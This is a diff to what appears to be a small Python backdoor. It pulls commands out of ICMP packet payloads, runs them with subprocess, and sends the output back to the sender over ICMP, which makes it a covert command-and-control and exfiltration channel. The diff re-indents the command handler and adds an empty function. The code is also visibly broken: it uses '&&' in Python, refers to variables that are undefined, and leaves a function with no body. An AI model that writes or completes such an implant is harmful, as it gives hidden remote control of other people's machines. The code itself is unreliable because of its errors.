@@ -5,7 +5,6 @@ import sys
 import socket 
 cmn_cmds = []
 verbose = False
-fname = ""
 ip=socket.gethostbyname(socket.gethostname())  
 """This is the only way I can thing to pass a file name from one if to aother
 There might be a better way to accomplish this but this is the only way I can come up with at the current moment
@@ -20,14 +19,15 @@ def cmd_mon(pkt):
     
 def cmd_proc(typ, code, source):
     if typ >= 44 && typ <= 94:
-    if code == 3:
-        instruct = pkt.getlayer(ICMP).load.decode()
-        result = sp.run(cmd, capture_output=True)
-        if result.check_returncode() is None and verbose:
-            print(result.stdout.decode())
-        send_output(result.stdout.decode(), source)
+        if code == 3:
+            instruct = pkt.getlayer(ICMP).load.decode()
+            result = sp.run(cmd, capture_output=True)
+            if result.check_returncode() is None and verbose:
+                print(result.stdout.decode())
+            send_output(result.stdout.decode(), source)
 
-
+def breakup(data):
+    
 
 def send_output(stdout, sender):
     send(IP(dst=sender)/ICMP()/stdout)
